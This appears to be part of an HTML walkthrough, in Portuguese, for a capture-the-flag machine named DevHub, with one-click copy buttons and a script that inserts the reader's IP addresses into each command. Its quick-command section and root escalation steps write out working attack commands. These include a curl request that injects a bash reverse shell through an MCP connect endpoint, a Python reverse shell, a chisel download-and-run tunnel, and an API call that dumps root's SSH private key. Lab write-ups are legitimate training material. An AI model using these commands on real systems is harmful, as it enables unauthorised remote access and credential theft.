+    <h3>5.6 Primeira flag</h3>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="cat /home/analyst/user.txt">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">analyst@devhub:~$</span> <span class="command ip-aware" data-raw="cat /home/analyst/user.txt">cat /home/analyst/user.txt</span></span>
+            <span class="output-line"><span class="highlight">40899195a6d87eeac32e3cd49b23807c</span></span>
+        </div>
+    </div>
+
+    <hr>
+
+    <!-- ============================================================ -->
+    <!-- 6. ROOT -->
+    <!-- ============================================================ -->
+    <a name="escalacao-root"></a>
+    <h2>👑 6. Escalação – root</h2>
+
+    <h3>6.1 Analisar OPSMCP</h3>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="cat /opt/opsmcp/server.py | grep -E 'VALID_API_KEY|HIDDEN_TOOLS'">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">analyst@devhub:~$</span> <span class="command ip-aware" data-raw="cat /opt/opsmcp/server.py | grep -E 'VALID_API_KEY|HIDDEN_TOOLS'">cat /opt/opsmcp/server.py | grep -E "VALID_API_KEY|HIDDEN_TOOLS"</span></span>
+            <span class="output-line"><span class="highlight">VALID_API_KEY = "opsmcp_secret_key_4f5a6b7c8d9e0f1a"</span></span>
+            <span class="output-line"><span class="highlight">HIDDEN_TOOLS = {"ops._admin_dump": {}}</span></span>
+        </div>
+    </div>
+
+    <h3>6.2 Extrair chave SSH do root</h3>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="curl -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' -X POST http://127.0.0.1:5000/tools/call -H 'Content-Type: application/json' -d '{\"name\": \"ops._admin_dump\", \"arguments\": {\"target\": \"ssh_keys\", \"confirm\": true}}'">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">analyst@devhub:~$</span> <span class="command ip-aware" data-raw="curl -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' -X POST http://127.0.0.1:5000/tools/call -H 'Content-Type: application/json' -d '{\"name\": \"ops._admin_dump\", \"arguments\": {\"target\": \"ssh_keys\", \"confirm\": true}}'">curl -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" ...</span></span>
+            <span class="output-line">"root_private_key": "<span class="highlight">-----BEGIN OPENSSH PRIVATE KEY-----</span> ..."</span>
+        </div>
+    </div>
+
+    <h3>6.3 Salvar chave e conectar</h3>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="nano root_key && chmod 600 root_key && ssh -i root_key root@[HTB_IP]">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">└─$</span> <span class="command ip-aware" data-raw="nano root_key">nano root_key</span></span>
+            <span class="output-line comment">[cole a chave, Ctrl+O, Ctrl+X]</span>
+            <span class="cmd-line"><span class="prompt">└─$</span> <span class="command ip-aware" data-raw="chmod 600 root_key">chmod 600 root_key</span></span>
+            <span class="cmd-line"><span class="prompt">└─$</span> <span class="command ip-aware" data-raw="ssh -i root_key root@[HTB_IP]">ssh -i root_key root@[HTB_IP]</span></span>
+            <span class="output-line"><span class="success-text">root@devhub:~#</span></span>
+        </div>
+    </div>
+
+    <h3>6.4 Flag root</h3>
+    <div class="terminal-wrapper">
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="cat /root/root.txt">📋 copiar</button>
+        <div class="terminal">
+            <span class="cmd-line"><span class="prompt">root@devhub:~#</span> <span class="command ip-aware" data-raw="cat /root/root.txt">cat /root/root.txt</span></span>
+            <span class="output-line"><span class="highlight">[FLAG ROOT]</span></span>
+        </div>
+    </div>
+
+    <hr>
+
+    <!-- ============================================================ -->
+    <!-- 7. ERROS -->
+    <!-- ============================================================ -->
+    <a name="erros"></a>
+    <h2>❓ 7. Solução de Erros Comuns</h2>
+    <p>Clique nas seções abaixo para ver o erro e como corrigi-lo.</p>
+
+    <div class="error-section">
+        <button class="error-toggle" onclick="toggleError(this)"><span>🔴 Erro: “Connection refused” / “Failed to connect”</span><span class="arrow">▶</span></button>
+        <div class="error-content">
+            <div class="error-item"><div class="error-title">Causa:</div><p>Netcat não está ouvindo, ou IP/porta incorretos.</p><div class="error-solution"><strong>✅ Solução:</strong><br>1. Certifique-se de que <code>nc -lvnp 4444</code> está rodando <strong>antes</strong> do curl.<br>2. Verifique se o IP no comando curl é o <strong>seu IP</strong> (ex: <code>[YOUR_IP]</code>).<br>3. Tente outra porta: <code>nc -lvnp 9001</code>.</div></div>
+        </div>
+    </div>
+
+    <div class="error-section">
+        <button class="error-toggle" onclick="toggleError(this)"><span>🔴 Erro: “Permission denied” ao baixar chisel</span><span class="arrow">▶</span></button>
+        <div class="error-content">
+            <div class="error-item"><div class="error-title">Causa:</div><p>Pasta sem permissão de escrita.</p><div class="error-solution"><strong>✅ Solução:</strong><br>Vá para <code>/tmp</code>: <code>cd /tmp && curl http://[YOUR_IP]:8000/chisel -o chisel</code></div></div>
+        </div>
+    </div>
+
+    <div class="error-section">
+        <button class="error-toggle" onclick="toggleError(this)"><span>🔴 Erro: “Connection closed” após curl</span><span class="arrow">▶</span></button>
+        <div class="error-content">
+            <div class="error-item"><div class="error-title">Causa:</div><p>IP errado no curl (usou IP da máquina alvo em vez do seu).</p><div class="error-solution"><strong>✅ Solução:</strong><br>Use <strong>seu IP</strong> (<code>[YOUR_IP]</code>) no <code>/dev/tcp/</code>.</div></div>
+        </div>
+    </div>
+
+    <div class="error-section">
+        <button class="error-toggle" onclick="toggleError(this)"><span>🔴 Erro: “Load key: unsupported”</span><span class="arrow">▶</span></button>
+        <div class="error-content">
+            <div class="error-item"><div class="error-title">Causa:</div><p>Chave mal formatada (com <code>\n</code>).</p><div class="error-solution"><strong>✅ Solução:</strong><br>Extraia a chave com <code>confirm: true</code> e cole apenas o bloco <code>-----BEGIN ... -----END</code>.</div></div>
+        </div>
+    </div>
+
+    <hr>
+
+    <!-- ============================================================ -->
+    <!-- 8. GLOSSÁRIO -->
+    <!-- ============================================================ -->
+    <a name="glossario"></a>
+    <h2>📚 8. Glossário de Termos</h2>
+    <div class="term-glossary">
+        <span><span class="term">Nmap</span> <span class="def">Enumeração de portas</span></span>
+        <span><span class="term">Netcat</span> <span class="def">Leitura/escrita em conexões TCP</span></span>
+        <span><span class="term">Shell reversa</span> <span class="def">Alvo se conecta ao atacante</span></span>
+        <span><span class="term">CVE</span> <span class="def">Identificador de vulnerabilidade</span></span>
+        <span><span class="term">Chisel</span> <span class="def">Ferramenta de túnel HTTP</span></span>
+        <span><span class="term">Jupyter Lab</span> <span class="def">Ambiente web para Python</span></span>
+        <span><span class="term">Token</span> <span class="def">Chave de autenticação</span></span>
+        <span><span class="term">SSH</span> <span class="def">Protocolo seguro remoto</span></span>
+        <span><span class="term">Root</span> <span class="def">Administrador do sistema</span></span>
+        <span><span class="term">Flag</span> <span class="def">String hash que comprova invasão</span></span>
+        <span><span class="term">Payload</span> <span class="def">Carga maliciosa</span></span>
+        <span><span class="term">Listener</span> <span class="def">Programa que aguarda conexões</span></span>
+    </div>
+
+    <hr>
+
+    <!-- ============================================================ -->
+    <!-- 9. RESUMO -->
+    <!-- ============================================================ -->
+    <a name="resumo"></a>
+    <h2>📋 9. Comandos Rápidos</h2>
+
+    <div class="card-grid">
+        <div class="card"><div class="emoji">🔍</div><div class="title">Enumeração</div><div class="desc">nmap -p- ... [HTB_IP]</div></div>
+        <div class="card"><div class="emoji">🚪</div><div class="title">Acesso Inicial</div><div class="desc">curl no MCPJam → mcp-dev</div></div>
+        <div class="card"><div class="emoji">🌉</div><div class="title">Túnel</div><div class="desc">chisel → Jupyter acessível</div></div>
+        <div class="card"><div class="emoji">👨‍💻</div><div class="title">Analyst</div><div class="desc">shell via Jupyter → flag user</div></div>
+        <div class="card"><div class="emoji">👑</div><div class="title">Root</div><div class="desc">OPSMCP → chave SSH → flag root</div></div>
+    </div>
+
+    <p><span class="tag tag-blue">Nmap</span></p>
+    <div class="code-block">
+        <span class="ip-aware" data-raw="nmap -p- -T4 --min-rate 1000 --open [HTB_IP]">nmap -p- -T4 --min-rate 1000 --open [HTB_IP]</span>
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="nmap -p- -T4 --min-rate 1000 --open [HTB_IP]">📋 copiar</button>
+    </div>
+
+    <p><span class="tag tag-blue">Acesso Inicial</span></p>
+    <div class="code-block">
+        <span class="ip-aware" data-raw="nc -lvnp 4444">nc -lvnp 4444</span>
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="nc -lvnp 4444">📋 copiar</button>
+    </div>
+    <div class="code-block">
+        <span class="ip-aware" data-raw="curl -X POST http://[HTB_IP]:6274/api/mcp/connect -H 'Content-Type: application/json' --data '{\"serverConfig\": {\"command\": \"bash\", \"args\": [\"-c\", \"bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1\"]}, \"serverId\": \"rce\"}'">curl -X POST http://[HTB_IP]:6274/api/mcp/connect -H 'Content-Type: application/json' --data '{"serverConfig": {"command": "bash", "args": ["-c", "bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1"]}, "serverId": "rce"}'</span>
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="curl -X POST http://[HTB_IP]:6274/api/mcp/connect -H 'Content-Type: application/json' --data '{\"serverConfig\": {\"command\": \"bash\", \"args\": [\"-c\", \"bash -i >& /dev/tcp/[YOUR_IP]/4444 0>&1\"]}, \"serverId\": \"rce\"}'">📋 copiar</button>
+    </div>
+
+    <p><span class="tag tag-yellow">Chisel</span></p>
+    <div class="code-block">
+        <span class="ip-aware" data-raw="./chisel server -v --port 8100 --reverse">./chisel server -v --port 8100 --reverse</span>
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="./chisel server -v --port 8100 --reverse">📋 copiar</button>
+    </div>
+    <div class="code-block">
+        <span class="ip-aware" data-raw="python3 -m http.server 8000">python3 -m http.server 8000</span>
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="python3 -m http.server 8000">📋 copiar</button>
+    </div>
+    <div class="code-block">
+        <span class="ip-aware" data-raw="cd /tmp && curl http://[YOUR_IP]:8000/chisel -o chisel && chmod +x chisel && ./chisel client [YOUR_IP]:8100 R:8888:127.0.0.1:8888">cd /tmp && curl http://[YOUR_IP]:8000/chisel -o chisel && chmod +x chisel && ./chisel client [YOUR_IP]:8100 R:8888:127.0.0.1:8888</span>
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="cd /tmp && curl http://[YOUR_IP]:8000/chisel -o chisel && chmod +x chisel && ./chisel client [YOUR_IP]:8100 R:8888:127.0.0.1:8888">📋 copiar</button>
+    </div>
+
+    <p><span class="tag tag-purple">Jupyter</span></p>
+    <div class="code-block">
+        <span class="ip-aware" data-raw="ps aux | grep jupyter">ps aux | grep jupyter</span>
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="ps aux | grep jupyter">📋 copiar</button>
+    </div>
+
+    <p><span class="tag tag-green">Analyst</span></p>
+    <div class="code-block">
+        <span class="ip-aware" data-raw="nc -lvnp 4445">nc -lvnp 4445</span>
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="nc -lvnp 4445">📋 copiar</button>
+    </div>
+    <div class="code-block">
+        <span class="ip-aware" data-raw="import socket,subprocess,os&#10;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&#10;s.connect((\&quot;[YOUR_IP]\&quot;,4445))&#10;os.dup2(s.fileno(),0)&#10;os.dup2(s.fileno(),1)&#10;os.dup2(s.fileno(),2)&#10;subprocess.call([\&quot;/bin/bash\&quot;,\&quot;-i\&quot;])">import socket,subprocess,os<br>s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)<br>s.connect(("[YOUR_IP]",4445))<br>os.dup2(s.fileno(),0)<br>os.dup2(s.fileno(),1)<br>os.dup2(s.fileno(),2)<br>subprocess.call(["/bin/bash","-i"])</span>
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="import socket,subprocess,os&#10;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&#10;s.connect((\&quot;[YOUR_IP]\&quot;,4445))&#10;os.dup2(s.fileno(),0)&#10;os.dup2(s.fileno(),1)&#10;os.dup2(s.fileno(),2)&#10;subprocess.call([\&quot;/bin/bash\&quot;,\&quot;-i\&quot;])">📋 copiar</button>
+    </div>
+
+    <p><span class="tag tag-red">Root</span></p>
+    <div class="code-block">
+        <span class="ip-aware" data-raw="cat /opt/opsmcp/server.py | grep VALID_API_KEY">cat /opt/opsmcp/server.py | grep VALID_API_KEY</span>
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="cat /opt/opsmcp/server.py | grep VALID_API_KEY">📋 copiar</button>
+    </div>
+    <div class="code-block">
+        <span class="ip-aware" data-raw="curl -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' -X POST http://127.0.0.1:5000/tools/call -H 'Content-Type: application/json' -d '{\"name\": \"ops._admin_dump\", \"arguments\": {\"target\": \"ssh_keys\", \"confirm\": true}}'">curl -H "X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a" -X POST http://127.0.0.1:5000/tools/call -H "Content-Type: application/json" -d '{"name": "ops._admin_dump", "arguments": {"target": "ssh_keys", "confirm": true}}'</span>
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="curl -H 'X-API-Key: opsmcp_secret_key_4f5a6b7c8d9e0f1a' -X POST http://127.0.0.1:5000/tools/call -H 'Content-Type: application/json' -d '{\"name\": \"ops._admin_dump\", \"arguments\": {\"target\": \"ssh_keys\", \"confirm\": true}}'">📋 copiar</button>
+    </div>
+    <div class="code-block">
+        <span class="ip-aware" data-raw="ssh -i root_key root@[HTB_IP]">ssh -i root_key root@[HTB_IP]</span>
+        <button class="copy-btn" onclick="copyCommand(this)" data-cmd="ssh -i root_key root@[HTB_IP]">📋 copiar</button>
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- FOOTER -->
+    <!-- ============================================================ -->
+    <div class="footer">
+        <p><span class="kali-logo">┌──(kali㉿kali)-[~]</span><br>🍔 <strong>DevHub</strong> – Guia com Adaptador Dinâmico de IPs</p>
+        <p style="font-size:0.8rem; color:#556688;">⚠️ Uso educacional em ambientes autorizados.</p>
+        <p style="font-size:0.8rem; color:#334455;">🇧🇷 Feito com 💙 para a comunidade</p>
+        <p style="font-size:0.7rem; margin-top:10px; color:#445566;">
+            <span class="tag tag-blue">🔍 nmap</span>
+            <span class="tag tag-purple">🐍 python</span>
+            <span class="tag tag-yellow">🏴 flags</span>
+            <span class="tag tag-red">👑 root</span>
+            <span class="tag tag-orange">⚙️ adaptador</span>
+        </p>
+    </div>
+
+</div>
+
+<!-- ============================================================ -->
+<!-- JAVASCRIPT: ADAPTADOR DE IPs + COPIA -->
+<!-- ============================================================ -->
+<script>
+    // ============================================================
+    // 1. FUNÇÃO PRINCIPAL: ATUALIZAR IPs
+    // ============================================================
+    function updateIPs() {
+        const yourIP = document.getElementById('your_ip').value.trim();
+        const htbIP = document.getElementById('htb_ip').value.trim();
+
+        if (!yourIP || !htbIP) {
+            const status = document.getElementById('configStatus');
+            status.textContent = '⚠️ Preencha ambos os campos de IP!';
+            status.style.borderLeftColor = '#d43f3f';
+            status.style.display = 'block';
+            return;
+        }
+
+        // Atualiza todos os elementos com a classe .ip-aware
+        const elements = document.querySelectorAll('.ip-aware');
+        elements.forEach(el => {
+            const raw = el.getAttribute('data-raw');
+            if (raw) {
+                let rendered = raw;
+                rendered = rendered.replace(/\[HTB_IP\]/g, htbIP);
+                rendered = rendered.replace(/\[YOUR_IP\]/g, yourIP);
+                el.textContent = rendered;
+            }
+        });
+
+        // Atualiza os data-cmd dos botões de copiar que estão ao lado de terminais
+        document.querySelectorAll('.copy-btn').forEach(btn => {
+            const wrapper = btn.closest('.terminal-wrapper');
+            if (wrapper) {
+                const terminal = wrapper.querySelector('.terminal');
+                if (terminal) {
+                    // Procura o primeiro .ip-aware dentro do terminal
+                    const cmdEl = terminal.querySelector('.ip-aware');
+                    if (cmdEl) {
+                        // Pega o texto renderizado e limpa
+                        let cmdText = cmdEl.textContent.trim();
+                        // Se for comando de múltiplas linhas, mantém estrutura
+                        btn.setAttribute('data-cmd', cmdText);
+                    }
+                }
+            }
+        });
+
+        // Atualiza os .code-block que têm .ip-aware
+        document.querySelectorAll('.code-block').forEach(block => {
+            const ipAware = block.querySelector('.ip-aware');
+            const btn = block.querySelector('.copy-btn');
+            if (ipAware && btn) {
+                const cmdText = ipAware.textContent.trim();
+                btn.setAttribute('data-cmd', cmdText);
+            }
+        });
+
+        // Mostra status de sucesso
+        const status = document.getElementById('configStatus');
+        status.textContent = `✅ Todos os comandos atualizados! (HTB: ${htbIP} | Seu IP: ${yourIP})`;
+        status.style.borderLeftColor = '#56b45d';
+        status.style.display = 'block';
+
+        // Esconde o status após 5 segundos
+        clearTimeout(window.statusTimeout);
+        window.statusTimeout = setTimeout(() => {
+            status.style.display = 'none';
+        }, 5000);
+    }
+
+    // ============================================================
+    // 2. FUNÇÃO DE COPIA (ATUALIZADA)
+    // ============================================================
+    function copyCommand(btn) {
+        // Pega o comando do data-cmd (que já foi atualizado pelo updateIPs)
+        let command = btn.getAttribute('data-cmd');
+
+        if (!command) {
+            // Fallback: tenta pegar do elemento .ip-aware mais próximo
+            const wrapper = btn.closest('.terminal-wrapper') || btn.closest('.code-block');
+            if (wrapper) {
+                const ipAware = wrapper.querySelector('.ip-aware');
+                if (ipAware) {
+                    command = ipAware.textContent.trim();
+                }
+            }
+        }
+
+        if (!command) {
+            alert('Erro ao identificar comando para copiar.');
+            return;
+        }
+
+        // Remove espaços extras e quebras de linha duplicadas
+        command = command.replace(/\s+/g, ' ').trim();
+
+        // Copia para o clipboard
+        navigator.clipboard.writeText(command).then(() => {
+            btn.textContent = '✅ copiado';
+            btn.classList.add('copied');
+            setTimeout(() => {
+                btn.textContent = '📋 copiar';
+                btn.classList.remove('copied');
+            }, 2000);
+        }).catch(() => {
+            // Fallback para navegadores antigos
+            const textarea = document.createElement('textarea');
+            textarea.value = command;
+            document.body.appendChild(textarea);
+            textarea.select();
+            document.execCommand('copy');
+            document.body.removeChild(textarea);
+            btn.textContent = '✅ copiado';
+            btn.classList.add('copied');
+            setTimeout(() => {
+                btn.textContent = '📋 copiar';
+                btn.classList.remove('copied');
+            }, 2000);
+        });
+    }
+
+    // ============================================================
+    // 3. FUNÇÃO PARA EXPANDIR ERROS
+    // ============================================================
+    function toggleError(btn) {
+        const content = btn.nextElementSibling;
+        const isOpen = content.classList.contains('open');
+        if (isOpen) {
+            content.classList.remove('open');
+            btn.classList.remove('open');
+            btn.querySelector('.arrow').textContent = '▶';
+        } else {
+            content.classList.add('open');
+            btn.classList.add('open');
+            btn.querySelector('.arrow').textContent = '▼';
+        }
+    }
+
+    // ============================================================
+    // 4. EXECUTAR AUTOMATICAMENTE AO CARREGAR
+    // ============================================================
+    document.addEventListener('DOMContentLoaded', function() {
+        updateIPs();
+    });
+</script>
+
+</body>
+</html>
